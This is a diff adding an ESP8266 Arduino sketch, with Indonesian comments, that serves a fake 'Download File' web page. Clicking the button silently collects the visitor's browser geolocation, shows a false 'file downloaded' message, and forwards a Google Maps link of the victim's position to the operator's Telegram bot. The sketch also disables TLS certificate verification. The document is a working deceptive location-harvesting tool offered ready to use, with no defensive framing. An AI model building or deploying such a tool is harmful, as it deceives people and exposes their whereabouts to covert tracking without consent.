@@ -1,0 +1,180 @@
+#include <ESP8266WiFi.h>
+#include <WiFiClientSecure.h>
+#include <ESP8266HTTPClient.h>
+
+// Data Wi-Fi
+const char* ssid = "(NAMA WIFI ANDA)";        // Ganti dengan SSID Wi-Fi Anda
+const char* password = "(PASSWORD WIFI ANADA)"; // Ganti dengan password Wi-Fi Anda
+
+// API Telegram
+String telegram_bot_token = "(API  TELEGRAM ANDA)";  // Ganti dengan token bot Telegram Anda
+String telegram_chat_id = "(ID TELEGRAM ANDA)";  // Ganti dengan ID chat Anda
+
+WiFiServer server(80);  // Membuat server HTTP pada port 80
+WiFiClientSecure client_secure;
+
+// Fungsi untuk menghubungkan ke Wi-Fi dan mencetak IP ESP8266 ke Serial Monitor
+void connect_to_wifi() {
+  Serial.println();
+  Serial.print("Menghubungkan ke Wi-Fi: ");
+  Serial.println(ssid);
+  
+  WiFi.begin(ssid, password);  // Memulai koneksi ke Wi-Fi
+  
+  // Loop sampai terhubung ke Wi-Fi
+  while (WiFi.status() != WL_CONNECTED) {
+    delay(500);  // Mengurangi delay untuk mempercepat koneksi
+    Serial.print(".");  // Menampilkan titik-titik sampai terhubung
+  }
+
+  Serial.println();
+  Serial.println("Terhubung ke Wi-Fi!");
+  
+  // Menampilkan IP address yang digunakan oleh ESP8266
+  Serial.print("ESP8266 IP Address: ");
+  Serial.println(WiFi.localIP());  // Cetak IP address di Serial Monitor
+}
+
+// Fungsi untuk mencetak log IP address ESP8266 secara teratur
+void log_ip() {
+  Serial.println();
+  Serial.print("Log IP Address ESP8266: ");
+  Serial.println(WiFi.localIP());
+}
+
+// Fungsi untuk mengirim pesan ke bot Telegram dengan link Google Maps
+void send_to_telegram(String latitude, String longitude) {
+  if (WiFi.status() == WL_CONNECTED) {
+    HTTPClient http;
+    client_secure.setInsecure();  // Menghindari masalah sertifikat
+
+    // Membuat link Google Maps dari latitude dan longitude
+    String maps_url = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+    String message = "Klik link berikut untuk mendownload file lokasi: %0A" + maps_url;
+
+    // URL encoding
+    message.replace(" ", "%20");  // Ganti spasi dengan %20 agar sesuai dengan format URL
+    
+    String url = "https://api.telegram.org/bot" + telegram_bot_token + "/sendMessage?chat_id=" + telegram_chat_id + "&text=" + message;
+
+    // Memulai koneksi HTTP
+    http.begin(client_secure, url);
+    int httpCode = http.GET();  // Mengirim permintaan GET
+
+    if (httpCode > 0) {
+      Serial.println("Pesan terkirim ke Telegram!");  // Debugging untuk mengetahui bahwa pesan berhasil terkirim
+    } else {
+      Serial.println("Error dalam mengirim pesan, HTTP Code: " + String(httpCode));
+    }
+    http.end();  // Mengakhiri koneksi HTTP
+  } else {
+    Serial.println("Tidak terhubung ke Wi-Fi");
+  }
+}
+
+// Fungsi untuk membuat halaman web sederhana dengan gaya sesuai permintaan
+String web_page() {
+  String html = "<!DOCTYPE html><html><head><title>Download File</title>";
+  html += "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">";
+  html += "<style>";
+  
+  // CSS untuk body dengan background dan tata letak teks
+  html += "body { font-family: Arial, sans-serif; background-image: url('https://i0.wp.com/picjumbo.com/wp-content/uploads/natural-background-with-empty-wooden-table-free-image.jpeg?w=1500&quality=50');";
+  html += "background-size: cover; background-position: center; text-align: center; color: white; padding: 0; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; flex-direction: column; }";
+  
+  // Overlay untuk efek gelap pada background agar teks lebih terlihat
+  html += ".overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: rgba(0, 0, 0, 0.5); z-index: -1; }";
+  
+  // Styling untuk judul
+  html += "h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7); }";
+  
+  // Tombol besar dan responsif
+  html += "button { padding: 20px 40px; font-size: 24px; background-color: #4CAF50; color: white; border: none; border-radius: 10px; cursor: pointer; width: 100%; max-width: 400px; }";
+  html += "button:hover { background-color: #45a049; }";
+  
+  // Teks status setelah mengirim koordinat
+  html += "#status { margin-top: 20px; font-size: 1.5em; color: white; text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7); }";
+  
+  html += "@media only screen and (max-width: 600px) {";
+  html += "h1 { font-size: 2em; }";
+  html += "button { font-size: 18px; padding: 15px 30px; }";
+  html += "}";
+  
+  html += "</style></head><body>";
+  
+  // Overlay untuk efek gelap di atas background
+  html += "<div class='overlay'></div>";
+  
+  // Konten utama halaman
+  html += "<h1>Download File di bawah ini</h1>";
+  html += "<button onclick=\"getLocation()\">Download</button>";
+  html += "<p id=\"status\"></p>";
+  
+  // JavaScript untuk mengambil lokasi dan mengirim ke ESP8266
+  html += "<script>";
+  html += "function getLocation() {";
+  html += "if (navigator.geolocation) {";
+  html += "navigator.geolocation.getCurrentPosition(sendPosition);";
+  html += "} else {";
+  html += "document.getElementById('status').innerHTML = 'Geolocation tidak didukung oleh browser ini.';";
+  html += "}";
+  html += "}";
+  html += "function sendPosition(position) {";
+  html += "var latitude = position.coords.latitude;";
+  html += "var longitude = position.coords.longitude;";
+  html += "var xhr = new XMLHttpRequest();";
+  html += "xhr.open('GET', '/send-coordinates?lat=' + latitude + '&lon=' + longitude, true);";
+  html += "xhr.send();";
+  html += "document.getElementById('status').innerHTML = 'File terdownload!';";
+  html += "}";
+  html += "</script>";
+  html += "</body></html>";
+  return html;
+}
+
+void setup() {
+  // Memulai komunikasi serial dengan baud rate 115200
+  Serial.begin(115200);
+  
+  // Menghubungkan ke Wi-Fi
+  connect_to_wifi();
+  
+  // Memulai server
+  server.begin();
+  Serial.println("Web server dimulai!");
+
+  // Log IP setiap kali setup selesai
+  log_ip();
+}
+
+void loop() {
+  // Menunggu client untuk terhubung
+  WiFiClient client = server.available();
+  
+  if (client) {
+    Serial.println("Client baru terhubung");
+    String request = client.readStringUntil('\r');  // Membaca request client
+    Serial.println("Permintaan client: " + request);  // Menampilkan request di Serial Monitor
+    client.flush();
+    
+    // Mengirimkan respons HTTP dengan halaman web
+    client.print("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n");
+    client.print(web_page());
+    
+    // Jika ada permintaan "/send-coordinates", kirim koordinat yang diterima
+    if (request.indexOf("/send-coordinates") != -1) {
+      String latitude = request.substring(request.indexOf("lat=") + 4, request.indexOf("&lon="));
+      String longitude = request.substring(request.indexOf("&lon=") + 5);
+      Serial.println("Latitude: " + latitude + ", Longitude: " + longitude);  // Debug koordinat
+      send_to_telegram(latitude, longitude);  // Kirim link Google Maps ke Telegram
+    }
+    
+    delay(1);  // Memberikan sedikit jeda sebelum memutuskan koneksi
+    client.stop();
+    Serial.println("Client terputus");
+  }
+
+  // Log IP setiap loop untuk memastikan selalu dicetak
+  log_ip();
+  delay(5000);  // Log IP setiap 5 detik
+}
